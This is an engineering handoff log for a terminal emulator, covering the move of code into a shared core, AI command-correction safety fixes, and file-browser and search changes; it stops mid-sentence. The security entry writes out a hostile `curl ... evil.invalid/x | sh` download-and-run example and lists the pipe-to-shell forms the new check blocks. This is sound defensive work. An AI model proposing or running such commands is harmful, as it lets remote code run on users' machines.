# Engineering handoff

Updated: 2026-08-29 (shared workflow engine adoption)

This baseline exact-pins the hardened shared core and jagent revisions and upgrades
Agent review, terminal parsing, configuration, persistence, sidebar/history, links,
and rendering safety. Agent snapshots are now claimed before restore, execution
identities are checked, and terminal-controlled clipboard and link capabilities
fail closed.

## Completed since the previous handoff

- **Shared workflow engine adoption — discovery, parsing, validation and
  rendering leave ember (2026-08-29)**: `src/workflows.rs` drops from 867 lines
  to a 241-line shim (127 before the test module) over `jterm_core::workflows`,
  and `src/workflow_picker.rs` (284 → 349) becomes an egui shell over the
  core's `WorkflowPicker` and `ArgsForm`. The workflow surface goes 1,151 → 590
  lines. The five-tier search path, the bounded
  `O_NONBLOCK | O_CLOEXEC | O_NOFOLLOW` reader, both serde parsers, the eleven
  budgets, validation and the `{name}` / `{{name}}` template engine are gone
  from this repo. All four terminals carried that code against the *same*
  on-disk format — anvil 1,164 lines, forge 801, ember 1,151, frost 1,143 — and
  they read the same files out of the same directories, so a divergence meant a
  workflow file *meant* something different depending on which terminal opened
  it. What stays here is policy, stated once and pinned by tests: app segment
  `ember` (with `EMBER_WORKFLOW_DIR` derived from it rather than typed),
  `XdgEnvDirs` as the discovery backend, `dev_root()` from ember's own
  `CARGO_MANIFEST_DIR`, and `LoadOrder::ByName` — which is now the single
  statement of ordering, since the picker no longer re-sorts what the loader
  handed it.

  BEHAVIOUR CHANGE: an argument that declares no default and is left blank is no
  longer substituted as the empty string. `kill -9 {pid}` submitted with an
  untouched Pid field used to render `kill -9 ` and fill it at the prompt —
  ember implemented that guard in `render`, unit-tested it, and then defeated it
  by pre-seeding every declared argument with `""`. The guard was green in
  isolation and dead in practice, in all four apps. The rule now lives in
  `render`, applied to the values map itself, so no dialog can seed past it, and
  `ArgsForm` carries Unset vs Supplied in the type system so the dialog can mark
  such rows with `*` (and print `* needs a value` in its footer) before the user
  presses Enter; submitting anyway reports `missing values: <names>` and keeps
  the dialog open. An argument that *declares* a default — `default = ""`
  included — may still render empty, so clearing a defaulted field stays a
  deliberate empty value and does not fall back to the default. Whitespace-only
  counts as blank. `ArgsForm::missing()` is deliberately a superset of what
  `render` will refuse: it flags every undefaulted blank row, while the error
  names only the ones the template actually references.

  This round also removed `default: ""` from `container` in the bundled
  `scripts/workflows/docker-tail-logs.yaml`. That is the one shipped example the
  new rule touches: the declaration said "an empty value is meaningful here"
  where the file plainly meant "required", so the headline guard would not have
  fired on the example ember ships — it would have inserted
  `docker logs -f --tail 100 `. Every other bundled argument declares a real
  default and is unaffected. The edit is family-wide by construction, and after
  it `diff -rq` reports `scripts/workflows` byte-identical across anvil, ember,
  forge and frost — forge's copy, which had diverged in five of six files and
  substantively in `find-large-files.yaml`, was reconciled to the other three in
  the same round. Name-keyed first-wins dedup means that divergence had made
  "Find large files" resolve to a *different command* in forge than in its
  siblings.

  Three more user-visible changes, all in the same direction: a workflow file
  whose declared argument name has leading or trailing whitespace is now
  rejected at load instead of loading with a row that could never bind (it used
  to render the literal `{ pid }`, call the form complete, and drop what the
  user typed); an unterminated `{{` is preserved even when a later placeholder
  closes a pair (`awk '{{print $1}' {{log}}` used to silently become a
  different, executable awk program, because the close scan ran to the end of
  the template — `{{` and `}}` nest now); and both halves of a skip log line are
  sanitised and bounded, where ember used to write `path.display()` and the
  parser's message raw into `log::warn!` and a TOML error quotes the offending
  source line back verbatim.

  One correction to the migration's own record: `src/workflows.rs`'s module doc
  says ember contributed `O_NOFOLLOW` to the union, and the pre-migration file
  says otherwise — its comment at the `custom_flags` call reads "anvil uses
  O_NONBLOCK | O_CLOEXEC; forge additionally passes O_NOFOLLOW. Ember takes the
  stricter set", so forge is the origin and anvil was the copy that would follow
  a planted symlink out of the workflow directory. Fix that sentence in the shim
  when the module is next touched. What ember did carry into the union is
  the `dirs`-crate discovery backend, now the core's `XdgEnvDirs` and the
  default for an app with no GTK dependency. `welcome_notebook_path` is still
  not ported: ember has no notebook surface and the core left that lookup with
  the two apps that do. `serde_yaml_ng` leaves this manifest — the loader that
  read YAML is now the core's, which depends on the same parser, and no other
  ember surface reads YAML. `fuzzy-matcher` stays a direct dependency:
  `history_picker.rs` and `command_palette.rs` still use it.

  These are user-visible, so they are documented where a user looks, not only
  here: README gained a `### Workflows` section (search path, file format, the
  undefaulted-argument rule, the `docker-tail-logs.yaml` change and the two
  strictness changes), a Highlights bullet and the missing `Ctrl+Shift+M` row in
  the keybinding table. Workflows had no README coverage at all before this
  round.

- **Shared command-correction engine adoption — the engine half leaves ember
  (2026-08-29)**: `src/command_correction.rs` drops from 2,335 lines to an
  889-line shim (566 before the test module) over
  `jterm_core::command_correction`, pinned at `badcce2`. Classification, token
  extraction, ranking, the safety gate, the prompt, the reply parser, the
  helper-trust predicate, the probe layer, the resolvers and the request epoch
  machine are gone from this repo; none of them ever mentioned egui. All four
  family terminals carried that same engine — anvil 1,817 lines, forge 2,148,
  ember 2,335, frost 1,552 — and all four had drifted, so the core now carries
  their union (3,937 lines including tests) and the apps shed 6,294 lines
  between them. What stayed is exactly ember's surface: the floating
  `egui::Window` keyed by session id with the CENTER_BOTTOM anchor and the
  theme-derived `Frame`, the bounded 2 s focus retry gated on
  `prompt_clean_idle`, the `armed` first-frame rule that stops a trailing Enter
  in the same input batch from approving a just-created card, the 50 ms
  `request_repaint_after` pump, and the `CorrectionEffect` /
  `CorrectionUiOutcome` types `app/commands.rs` applies to the PTY. No call site
  outside the module changed, and `Cargo.lock` moves only the pin (plus
  `fuzzy-matcher`, which ember already depends on directly, appearing under
  `jterm_core`); `jagent` stays at `f9383ec`.

  The three legitimate disagreements between the copies became construction-time
  policy with no `Default` where safety is involved, following the
  `BusyChatPolicy` precedent from the chat-store round. Ember states all three
  and nothing else: `LocalEvidence::SameNamespace { search_path: <split PATH>,
  helpers: HelperStrategy::TrustedPathScan }` (ember owns its PTYs, so this
  process's namespace *is* the failed command's), `context_sharing(config)` from
  `ensure_semantic_context_sharing_allowed`, and a named probe thread. The
  policy is rebuilt per request because the consent switch is a live config
  value. One dead branch disappeared with the move: ember's copy consulted
  `jterm_core::host::is_flatpak()` — the only occurrence of that symbol anywhere
  in ember, inherited from anvil — to decide whether to enumerate PATH, which
  could only ever be false here, and was inverted anyway.

- **Three security holes in the correction path, two of them ember's own
  (2026-08-29)**: this surface decides whether a model-proposed command may be
  offered for execution into a pre-filled, auto-focused field, so the copies'
  divergences were not style.

  *A third user's binary was a trusted system helper.* Ember asked
  `owner_uid == euid || mode & 0o022 != 0` for "untrusted", so a binary owned by
  another account at mode 0755 answered "not untrusted" — trusted — and helper
  resolution reached it by scanning the user's own `PATH`. On a shared build box
  with `/opt/vendor/bin/bash` owned by uid 1234 ahead of `/usr/bin`, any failed
  command spawned it automatically. Clamping the child's `PATH` never helped:
  the helper was itself the hostile binary. The same expression was wrong
  inverted for root — `owner_uid == euid` is true for every root-owned system
  binary under `sudo ember` or in a container, so every helper was refused and
  `apt-cache pkgnames` could never run, with no diagnostic anywhere the user
  would see. `jterm_core::helper::trusted_component` already answered both
  halves and only frost used it; the shim now resolves through it. The cost is
  real and worth stating: on a host where neither `bash` nor `apt-cache` passes
  the predicate, PATH evidence survives (name enumeration falls back to a
  read-only directory walk of the same `PATH`), but APT-verified package
  corrections disappear, because nothing else can answer that question.

  *A candidate could add a pipe into a shell.* `syntax_markers` only tested
  whether a marker was *present*, so against an original that already contained
  a pipe, appending `| sh` introduced no new marker and passed the superset
  check. Ember had no separate check at all (only forge did, as four literal
  spellings). A failed `curl -sS https://example.invalid/setup | head -20` could
  therefore be answered with `curl -sS https://evil.invalid/x | sh`, pre-filled
  and focused. The shared rule splits the pipeline quote-aware and compares the
  SET of interpreter stage names, pinned by a test against jagent's own lexer,
  so `|  sh`, `| /bin/sh`, `| zsh`, `| dash`, `| busybox sh` and
  `| xargs -n1 sh -c` are refused while `ls | gerp foo` → `ls | grep foo` is
  still offered.

  *Consent* is the one where ember was the family's best copy rather than its
  worst: it was the only terminal that honoured `ai_share_command_context`
  before shipping the failed command, the cwd and up to 8 KiB of output to a
  provider, and that is now the union's `ContextSharing`, with no `Default` and
  a `ConsentProof` witness that `correction_prompt` demands. Ember's observable
  behaviour is unchanged here — withheld consent already meant no AI fallback —
  but the shim no longer conditionally builds the client. It always builds it
  and lets the policy refuse before the provider stage, which is the point of
  moving consent into the type system rather than into a call site's `match`.

- **The card stops trusting text it did not write, and admits when a draft is
  destructive (2026-08-29)**: ember interpolated the provider's `message`
  directly into `ui.label` one line above the editable, pre-filled,
  auto-focused command field; `validate_message` checked length and NUL only,
  so a reply embedding U+202E could reverse the rendered order of the prose
  beside the command about to be inserted at the shell prompt. The card now
  reads only the engine's sanitised display accessors — `display_title`,
  `display_badge`, `display_description` — which collapse to one display line
  with controls and bidi replaced by U+FFFD. `set_feedback` sanitises and bounds
  to 200 characters on the way in, so the accept-path rejection string and the
  app's PTY-write error get the same treatment; note that ember's own
  provider-JSON parse errors never reached the card in the first place (they
  went to `log::debug`), so that particular bound is defence, not a repair.
  Separately, the card gained the destructive-risk label anvil and forge already
  had, in ember's own Agent-card idiom (`⚠ destructive: {reason}` in
  `error_fg_color`). `is_dangerous` never gated whether a candidate is
  *offered* — it is one conjunct of `verified_run_allowed`, whose
  `is_verified()` conjunct is false for every AI and target-output proposal — so
  `rm -rf ~/work` always reached the card and ember drew it in exactly the
  chrome it gave `git status`. It is recomputed after each frame's edit, so a
  draft the user makes destructive is labelled on the same frame, and the
  primary action's label is now computed after that edit rather than from the
  previous frame's buffer, so "Run verified command" / "Insert for review" can
  no longer be one frame stale relative to what the button does.

- **Fewer cards, and the ones that stop appearing are the untrustworthy ones
  (2026-08-29)**: a completion the shell did not itself report no longer raises
  a correction card. Ember checked nothing here even though its execution
  journal, its Agent panel and its long-command toast all bail on
  `is_trusted_completion()`. A `BoundaryInferred` block — a later prompt forced
  it shut and the OSC 133 end mark never arrived — attributes stale scrollback
  and a guessed status to a command, so the classifier could read "command not
  found" out of the *previous* command's output and build the whole request,
  prompt and card on that misattribution. Cards that used to appear after an
  interrupted or force-closed block will stop appearing. A command line over
  16 KiB is now declined at classification instead of being classified, ranked,
  probed and prompted about; ember relied on `review_input`'s 256 KiB cap while
  this surface's own declared budget has always been 16 KiB. Working-directory
  handling in the provider payload also changed shape: a cwd over 4 KiB is now
  sanitised and truncated into the payload rather than replaced wholesale by
  `.`, and an absent cwd is sent as an empty string rather than `.`. Finally,
  the set of programs this surface may ever execute narrowed from ember's
  `{apt-cache, bash, sh, sleep, head}` name allow-list to the core's two closed
  `TrustedHelper` constants (`bash`, `apt-cache`). No user-visible effect — both
  call sites always passed `bash` or `apt-cache` — but `sh`, `sleep` and `head`
  were in ember's *production* allow-list purely so one unit test could exercise
  `run_capture`'s bounds.

- **Tests follow the code they pin (2026-08-29)**: the module's suite goes from
  23 tests to 7. Twenty that duplicated the engine are gone — the classifier,
  ranking, reply parsing, the candidate gate, output sampling, the epoch
  machine, the timeout boundary, and four probe/helper-trust tests that forked
  real processes — and their subjects are tested in the core against its own
  fixtures. Three that covered ember's wiring survive by name
  (`disabled_monitor_and_agent_executions_never_start_a_request`,
  `target_suggestion_flows_from_completion_to_presented_card`,
  `failed_apply_keeps_the_card_and_success_retires_it`) and four are new:
  `ember_states_its_correction_policy_explicitly` pins all three policy choices
  including that the split `PATH` is actually present,
  `only_a_shell_reported_completion_can_raise_a_card` pins the new trusted-
  completion trigger,
  `the_card_reads_only_engine_sanitised_text_and_labels_a_destructive_draft`
  pins the accessors the card body reads and the destructive label, and
  `a_disabled_surface_cancels_an_in_flight_request_and_drops_the_session`
  pins the disabled-mid-flight path. The two safety tests were
  mutation-checked: flipping `trusted_completion` to `true`, and `Withheld` to
  `Consented`, each turns its test red.

- **Shared AI chat store adoption — one library state machine for the family
  (2026-08-29)**: `src/ai_chat_store.rs` is now a 76-line shim over
  `jterm_core::ai::chat_store`. Ember's own ~900-line port of anvil's multi-chat
  store, and the unit tests that pinned it, are gone: all four terminals had
  grown a private copy of the same state over the shared
  `jterm_core::ai::ConversationSnapshot` schema, all four had drifted, and no
  copy was correct alone, so the core now carries their union (1,888 lines, 47
  tests) and every app keeps only a shim. The core's copy is stricter than
  ember's port was in the ways that matter here: a library-wide 8 MiB
  live-history budget with real compaction, library previews sanitized through
  `review_input::safe_inline_display`, idempotent draft merging so a recovered
  retry cannot multiply itself across saves, and an at-capacity guard so
  archiving cannot mutate and then fail. The one decision ember still owns is
  `BusyChatPolicy::Refuse`, pinned on both `new_store` and `restore_store` and
  tested on both construction paths — nothing in the panel cancels an in-flight
  request before archiving or deleting a chat (forge's panel does, and takes
  `Allow`), so a policy flip would silently orphan a running request's chat.

- **AI chat library persistence — compaction before serialising, and failures
  the user can see (2026-08-29)**: `persist_encoded` now builds its snapshot
  with `snapshot_for_persistence`, which compacts the library *before*
  `ConversationSnapshot::from_chats` validates it. Ember's port compacted
  nothing on the way out and bounded no library as a whole — the store's other
  caps are per chat (100 turns, 256 KiB per assistant reply), which a 50-chat
  library outgrows — so a long-lived library could reach a size persistence
  refuses, after which `Err(SnapshotInvalid)` was the only outcome and nothing
  could be saved at all, every later chat included. The budgets are
  deliberately unequal (8 MiB live history, 4 MiB of persisted turn text), so
  `from_chats` still compacts on the way out and reports it through its returned
  flag; the durable view is a clone, so `persist_library_to` folds the written
  snapshot back with `sync_truncation_markers` and the chat row plus the status
  line say what the file could not keep instead of a short saved copy looking
  complete. The clone is flattened with `recover_retry_payload_detaching` — the
  refusing `recover_retry_payload` is right for a live chat, but here the live
  chat legitimately still has its request in flight and must keep its own draft.
  Above that, the library file keeps its own 4 MiB budget (statically asserted
  below `MAX_CONVERSATION_SNAPSHOT_JSON_BYTES`) with `compact_to_measured_limit`
  measuring the real encoding. Write failures are no longer only a `log::warn`:
  a GUI launch never shows stderr, so a library that stopped saving looked
  exactly like one that saves fine until the next launch found the session's
  chats gone. `PersistOutcome::Failed` now carries a sentence to the panel, and
  a window that will never write — a non-owner instance, or a blocked restore
  refusing to overwrite a file it could not read — says so above the
  conversation rather than in a startup log line.

- **Palette Ask-AI repairs — a dismissible card and a provable session
  (2026-08-29)**: the `?` suggestion review card could not be dismissed at all.
  Dismiss, Escape and the window ✕ were all no-ops, because
  `SuggestionUiOutcome` had no `Dismissed` variant: nothing but a successful
  insert or closing the bound terminal ever cleared
  `TerminalApp::ai_command_suggestion`, and `show` re-rendered the card on the
  very next frame. The variant exists, `rendering.rs` drops the session on it,
  and dismissing also cancels the request still running behind the card, which
  nothing would otherwise harvest. `generation` was the constant `1` on every
  session, so both `suggestion_reply_is_current` and `complete_accept` compared
  `x == x` — the staleness defence was inert and every card in every pane shared
  one egui window id; a process-wide monotonic counter now makes a reply or an
  accept-effect that outlived its session provably stale. The palette entry
  fails closed in the same direction: `?` switches the list to the single AI
  row, an empty request accepts nothing rather than falling through and
  dispatching whatever command happens to be highlighted, a request past
  `MAX_AI_QUERY_BYTES` (64 KiB, core's own private `MAX_USER_PROMPT_BYTES`,
  past which `sample_output` elides the middle of the instruction) is refused
  with the reason on screen, and the raw query is trimmed before the prefix
  check so a leading space cannot silently drop the user back into ordinary
  command matching. The generated command is inserted for review through the
  same guarded prompt-write path as command correction — alt-screen, prompt
  readiness, bracketed paste, pending input and an empty prompt are all
  required — and Enter stays the user's own keypress.

- **AI chord and history-cwd contracts (2026-08-29)**: `Ctrl+Shift+Alt+A` now
  opens the read-only AI chats library, as it does in anvil, forge and frost;
  `agent:toggle` moved off it to the family's `Ctrl+Alt+G`. Ember was the one
  terminal where that gesture opened the panel that runs commands after
  approval, which is the worst direction for a family contract to be wrong in.
  The command id is the canonical singular `ai_chat:toggle` (matching
  `agent:toggle`, `sidebar:toggle`, `debug:toggle`), and a test pins the pair,
  the round trip, and `jterm_core::keybindings::Chord`'s canonical
  `ctrl+shift+alt+a` storage and `Ctrl+Shift+Alt+A` display spelling.
  Separately, `history_picker::MAX_HISTORY_CWD_BYTES` rises from 4 KiB to the
  16 KiB `jterm_core::command_history` itself writes with: the family shares one
  JSONL history file, so the smaller bound silently degraded a deep directory to
  `cwd: None` on write (permanently, with no notice) and erased a sibling
  terminal's 4–16 KiB cwd on read.

- **Remote Files rounds 21–30 — transactional navigation and bounded ageing
  (2026-08-29)**: endpoint switches stage both home discovery and the first
  listing, while path/root changes scan a detached, generation-stamped
  candidate; only the latest successful listing commits. Failure, queue
  rejection, cancellation, and out-of-order completion preserve the last-good
  root, selection, expanded descendants, current path, and success-only
  history. Back/Forward (32 entries), Up/Home, clickable breadcrumbs, and a
  Ctrl+L absolute-path editor share this commit boundary; path input is
  UTF-8/4-KiB bounded, lexically normalized, and rejects relative/root-escaping,
  control, and bidi text. An eight-root authority-bound cache preserves loaded
  descendants and is invalidated at exact operation parents. Visible remote
  snapshots older than 60 seconds revalidate stale-while-revalidate on a
  five-second tick with a two-directory budget. Retryable failures use capped
  1/2/4/8/16/30-second automatic cooldowns, non-retryable failures stop
  automatic retries, and explicit Retry remains available. The Files status
  surface distinguishes queue delay from scan execution time. Deterministic
  tests cover atomic success/failure, stale-result rejection, history/cache
  bounds, path attacks, retry classification, TTL budget/cooldown, and timing.

- **Remote Files rounds 11–20 — bounded scheduling and native navigation
  (2026-08-29)**: directory scans now use a 64-pending/two-worker envelope with
  Root/Retry/Lazy priority, bounded anti-starvation, same-path physical
  coalescing, collapse cancellation, and visible pending/queued counts. The
  serialized operation queue is independently capped at 64. Last-good directory
  snapshots record completion age; mutation reconciliation refreshes exact
  materialized parents and restores focus to confirmed create/copy/rename/
  transfer destinations. Remote double-click, Up/Home and scoped Alt+Up/
  Alt+Home navigate the tree itself and never write a remote path to an
  unrelated terminal. Home parsing is strict UTF-8/single-line/absolute, while
  UI diagnostics use stable error classes plus credential redaction,
  control/bidi removal and Unicode-safe bounds. Queue saturation, priority
  fairness, coalescing, collapse cancellation, strict home output, diagnostic
  attacks, freshness and selection restoration all have deterministic tests.

- **Remote Files probe v4 and recoverable UI (2026-08-29)**: superseding a
  per-directory request now cancels queued work and kills a running remote
  probe process group. The list protocol filters hidden rows and stops at the
  requested retained ceiling remotely, classifies symlinks before directories,
  and rejects invalid UTF-8, oversized, dangerous, or duplicate/colliding
  basenames before constructing an actionable path. Initial/stale errors have
  an in-place Retry control, refreshing and first-load states are distinct, F5
  and Files Alt/Ctrl+L navigation require both panel hover and actual tree-row
  focus (filter/path editors and popups retain their keys), and reconciliation prunes
  vanished selections while revoking delayed path actions. A last-good stale
  snapshot remains browsable, but path-dereferencing/mutating actions fail
  closed until Retry succeeds; Refresh and Copy Path remain available.

- **Remote Files resilient refresh (2026-08-29)**: directory scans now carry
  both the tree generation and a per-path latest-wins revision, preventing an
  older slow SSH/Docker response from overwriting a newer refresh. Root and
  loaded-directory refreshes keep the last-good rows visible, reconcile
  surviving directories in place by path/type (preserving loaded descendants,
  expansion and pagination), and retain that snapshot with an inline error if
  revalidation fails. A generation change retires orphaned nested Loading
  states so stale work cannot leave the tree permanently busy.

- **Files hidden-entry policy (2026-08-29)**: a visible **Hidden** control now
  switches local and remote dotfile policy together. The policy is frozen into
  every scan request; changing it clears row selection and rebuilds the root
  under a new generation, so queued or slow old-policy results cannot publish.
  Remote parsing and local enumeration apply the preference before the retained
  entry cap, preventing hidden-heavy directories from starving visible rows.

- **Process-observed SSH → Files following (2026-08-27)**: every interactive
  terminal presentation now observes only the focused session's real `/proc`
  foreground argv and recognizes direct SSH plus the constrained jsh launcher
  shape from `jterm_core` revision
  `1f5f0fbcfd91a084da9216392fe5ab26a5994adc`. OSC/text/title evidence is out of
  bounds, and Ember-managed remote panes are skipped. A sidecar BatchMode home
  probe is staged without blanking or switching the current tree; its callback
  requires the exact session, raw argv, normalized profile, ControlPath
  overlay, focus/observation epoch, Files location/root/generations, pending-op
  state, an independent synchronous active-session epoch, and sidebar UI
  snapshot before any mutation. Result draining happens after all frame input
  surfaces, closing the render-order focus TOCTOU. Failure retains the tree and
  exposes both a bounded toast action and a persistent exact-observation Files-
  header Retry control explaining key/agent/ControlMaster requirements; SSH
  exit does not return Files to Local. Retry dedupe
  distinguishes ordinary user cancellation from focus A→B→A re-entry.
  Stable saved/transient identity excludes ControlPath while immutable
  execution snapshots carry it through scans, file ops, clipboard, both
  transfer legs, drop, and terminal launch. Final saved matching is unique and
  recomputed after config changes; otherwise a temporary selector row is
  retained. Saved/transient forms of one transport use direct copy/rename and
  prefer a live overlay. Same-target equal-overlay observations reveal the
  existing tree; a different live socket must pass a staged probe before an
  in-place rebind, which preserves root/loaded rows/expansion and generation-
  retires old socket loads. Probe failure preserves the old overlay. Temporary
  terminal launch is a plain validated `ssh -t` login. A saved location with a
  live overlay also opens a plain login with that exact socket rather than its
  deploy command; cwd-relative ControlPaths fail closed unless absolute or in
  strict `~/...` form. Long DSW endpoints are
  safely middle-elided in the selector while their complete bounded endpoint
  remains available in hover detail.

- **Files clipboard/transfer race closure (2026-08-27)**: every user Copy/Cut
  now receives a monotonically advancing intent token. Paste requests/results
  freeze that token; full-success clearing and partial-batch shrinking occur
  only while it is still current, so an older slow paste cannot mutate a later
  identical clipboard action. Exact remote-profile reorder preserves the token
  while remapping its payload. Operation progress/results now use a stable
  location-authority generation rather than the presentation scan generation,
  and every Done event retires its exact transfer token before stale UI effects
  are gated. Refresh/root changes therefore settle clipboard bookkeeping and
  cannot strand a progress/Cancel row, while a real Local/remote authority
  change still drops late effects. Deterministic channel tests cover clear ABA,
  partial-shrink ABA, token-preserving reorder, and Refresh-during-transfer.

- **Files terminal entry and remote identity recovery (2026-08-27)**: the Files
  header now exposes one explicit terminal action. Local opens a fresh
  interactive tab at the exact current tree root; SSH/Docker opens the current
  validated profile at its normal default directory, with the distinction in
  the visible label and hover text. Remote Files state no longer trusts a
  mutable config index: host-list changes uniquely remap the old complete
  profile identity, while a missing, edited, duplicated, invalid, or inactive
  profile fails closed to Local and invalidates the stale selection, transfer
  tokens, and scan generation. Clipboard authority is reconciled separately:
  an independently valid remote source survives/remaps with its intent token,
  while an unprovable source alone is cleared. A failed remote start-dir
  probe now also reports the failure and automatically recovers to Local. File
  menu actions and delayed New/Rename/Delete dialogs carry a tree-generation +
  complete-location stamp; root/profile changes close and reject those intents
  before they can dispatch an old path against Local or another remote.
  State regressions cover terminal-target semantics, reordered profile and
  clipboard remapping (including A-tree fallback with independently retained
  B clipboard), ambiguous identity rejection, stale-state/dialog-token cleanup,
  explicit local cwd creation, and no-network start-dir recovery.

- **Block Search 4.4 (2026-08-26)**: virtual result rows and stars now use
  direct stable egui interactions, so each exposes one authoritative AccessKit
  button node and one activation event instead of layering a glyph/empty button
  semantic beneath its explicit label. Each star's accessible name includes
  result rank plus bounded real command/output context, allowing repeated star
  controls to be distinguished. Tab or AccessKit focus on a star synchronizes
  the picker selection before the same stable target is toggled; keyboard and
  assistive-tech activation restores focus to that star or the nearest surviving
  Bookmarked row, with the query as the empty-result fallback. A headless egui
  regression now verifies the emitted Button role, label, toggled state,
  Focus/Click actions, focus transfer, and exactly-once click event. Logical-B
  latch names and comments now match the non-QWERTY behavior shipped in 4.3.
  Focused result-row Enter/Shift+Enter is now exclusively accepted by the input
  prepass; render accepts primary-pointer, standard focused-button Space, or
  targeted AccessKit Click, with a headless exactly-once regression covering
  each keyboard route and egui's Enter fake-click edge.
  A stale star target now rebuilds without discarding the selection anchor and
  restores focus from the shared action after rejection, including the
  picker-local `Ctrl+Shift+B` route. Finally, Bookmarked empty-state
  diagnosis independently checks whether bookmarked records have real indexed
  text in the selected scope, so a non-empty query no longer masks a scope-text
  absence as an ordinary query miss.

- **Block Search 4.3 (2026-08-26)**: each virtual result row now exposes an
  independent, selected-state `☆` / `★` button; activating it changes only the
  bookmark and never jumps or closes the picker. Exact `Ctrl+Shift+B` applies
  the same action to the highlighted hit. A logical-B latch consumes repeats
  through modifier release, resets on B release/focus loss/close, and leaves
  ordinary Shift+B text repeats alone. A configured `block:search` remap onto
  Ctrl+Shift+B retains close/repeat priority. Pointer and keyboard actions carry a
  stable hit plus finalized-record generation and revalidate the live record
  before resolving its terminal-owned monotonic sequence; duplicate command and
  output hits therefore share one bookmark truth, while stale rows only report
  and refresh. Removing a result under the Bookmarked filter uses the existing
  anchor refresh to retain the nearest surviving selection. Runtime-only
  bookmark sets and revisions are session scoped, are removed on session close,
  and prune only when the retained `command_records` deque identity changes;
  captured-output/snapshot eviction cannot erase a live bookmark or alias a
  later PTY-reused record id. Empty-query metadata browsing now uses only real
  command/output text and the first nonblank retained output line. Result rows,
  bookmark buttons, filter controls, stale/unavailable feedback, empty states,
  and the wrapped shortcut footer expose explicit accessible widget state via
  eframe's AccessKit bridge.

- **Block Search 3.9 (2026-08-26)**: manual refresh is now pointer-accessible
  through a visible Refresh control, and that button shares the exact
  selection-preserving path with plain, non-repeated F5. The currently configured
  `block:search` chord wins if it is remapped onto F5; other modified F5 chords
  are not reinterpreted as refresh, and the new two-row header keeps the query
  usable at minimum width. Escape and the currently configured `block:search` chord
  now terminate the picker's whole input batch, so later events from the same
  frame cannot rebuild or activate released state. Auto-repeat from the physical
  chord that opened the picker is consumed without toggling it closed; a fresh
  non-repeat press retains the normal close behavior. Same-pane completed-record
  churn now defers its destructive cache rebuild while the current query intent
  is invalid, preserving the last valid results until correction; pane switches
  still release the old terminal's identities immediately. Tab/Shift+Tab and
  AccessKit focus requests that precede Enter in one input batch now leave Enter
  to the newly focused intent control instead of activating a search result from
  the previous frame's focus snapshot.

- **Block Search 3.3 (2026-08-26)**: continuous review now advances only
  after the selected completed record is revalidated and revealed. Plain Enter
  likewise closes only after success; a concurrently evicted target leaves the
  picker open, reports the stale record, and forces a fresh hit computation.

- **Block Search 3.2 (2026-08-26)**: the virtual result list now supports
  Home/End and bounded ten-row PageUp/PageDown moves in addition to wrapping
  arrows. Its footer reports current position plus total/cap state, and every
  keyboard jump requests one precise scroll-to-selection operation.

- **Block Search 3.1 (2026-08-26)**: `All / Cmd / Out` surface scopes and a
  `Ctrl+O` cycle now restrict matching before the result cap. The same scope
  covers empty-query metadata browsing, and query/filter/index refresh safety
  remains intact.

- **Block Search 3.0 (2026-08-26)**: the bounded cache now combines `Aa`,
  regex, and Unicode whole-word matching, exposed through both pointer controls
  and `Ctrl+I` / `Ctrl+R` / `Ctrl+W`. Boundary filtering is allocation-free per
  line, and case-insensitive whole-word literals use the linear regex engine so
  a line full of rejected partial matches cannot cause quadratic remapping.

- **Single-interpretation native JSON boundaries (2026-08-25)**: after their
  existing raw byte ceilings, the private `auth.json` reader and every Codex
  app-server JSONL record now run through
  `jterm_core::bounded_json::validate_no_duplicate_members` before typed or
  `Value` decoding. Duplicate object members are rejected recursively,
  including escaped-equivalent names and duplicates inside ignored/future
  extension objects. The private serde_json RawValue sentinel is also reserved,
  so feature-unified `Value` decoding cannot reparse unchecked embedded JSON.
  An app-server frame therefore cannot select one `id`,
  `method`, or nested result for request correlation while another decoder or
  audit surface sees a different value; credential parsing likewise has one
  structural interpretation. The shared preflight retains no decoded value
  tree and never reflects the untrusted member name in its error.

- **Shared terminal metadata contracts (2026-08-25)**: jsh session ids now
  delegate to `jterm_core`'s exact grammar and byte bound instead of maintaining
  a local mirror. The Commands sidebar also reuses Block chrome's duration
  formatter, keeping millisecond, second, minute, and hour labels identical.

- Block Mode convergence closes the remaining interaction gaps with Frost.
  Normal text selections in collapsed projections now carry stable raw-cell or
  raw-row endpoint identities across compatible plan updates; width changes,
  column selections, effective-collapse changes, ambiguous reflow and eviction
  still fail closed, including a live-grid trailing blank that is trimmed when
  its row enters history. Block Search adds `Shift+Enter` reveal-and-step without
  closing, uses a fixed-height virtual list that preserves the complete mouse
  scrollbar extent without constructing all 500 possible hit widgets, keeps a
  stationary hover from stealing keyboard traversal, preserves pointer scroll
  when a background refresh retains the exact highlighted row, and
  diagnoses a pane with no OSC 133 marks with the actionable jsh installer path.
  Cold projection planning
  consumes layout streams once and reuses per-group scratch allocations while
  preserving the existing incremental plan, cache-key and revision contracts.
  The shared core exact pin advances to
  `21437ba6f0cb85e74d4ce2a03ef1857de2c55d9d`, adding core-owned Agent
  claim durability and recursive duplicate-member rejection at jagent's JSON
  boundaries without changing `block_contract` semantics.

- Block Search 2.0 replaces Ember's former potentially hundreds-of-megabytes,
  open-time-only cache. Completed records are sampled lazily newest-first under
  an 8 MiB retained source budget and normalized into a 16 MiB retained cache; both
  budgets count Vec storage, stable record-id capacity, original text, and
  lowercase text. The UI says when older blocks were omitted. Finalized-record
  identity is `(len, oldest sequence, newest sequence)`, so same-length deque
  rotation rebuilds the cache and Enter refreshes that identity before acting;
  an old hit cannot bind to replacement history. The picker adds
  All/Failed/Slow/Bookmarked/Background browsing plus `Aa` case matching and a
  bounded Rust-regex mode. Raw query state is rebuilt into a compact allocation
  capped at 4 KiB (plus at most one complete UTF-8 overflow scalar), regex
  compilation at 2 MiB; invalid regexes
  retain the prior usable index/hits but hide and disable them until corrected.
  Lowercase expansion and regex byte ranges map back to original Unicode scalar
  spans, long previews surround the match, and accepted output hits validate the
  complete cached span before revealing its exact physical soft-wrap row;
  collapsed output expands only after that raw anchor proves its owner, with
  stale span → logical-line start → already-revealed block header fallbacks.
  Rebuild drops the prior cache/hit Vec allocations before source extraction,
  preventing old+source+new coexistence. The first rejected source (bounded by
  the 256 KiB per-record output cap) and one rejected lowercase candidate are
  transient allocations outside those retained ceilings. Cache reconstruction
  currently remains
  synchronous on Ember's UI thread, but only on open/finalized-version changes
  and under the two retained ceilings; keystrokes only scan the cache.

- Font file inputs now read through a bounded descriptor boundary
  (`src/font_file.rs`). Every candidate named by `fc-match` output or the
  config file is opened with `O_NOFOLLOW | O_NONBLOCK | O_CLOEXEC`, validated
  as a regular file through the resulting descriptor, capped at
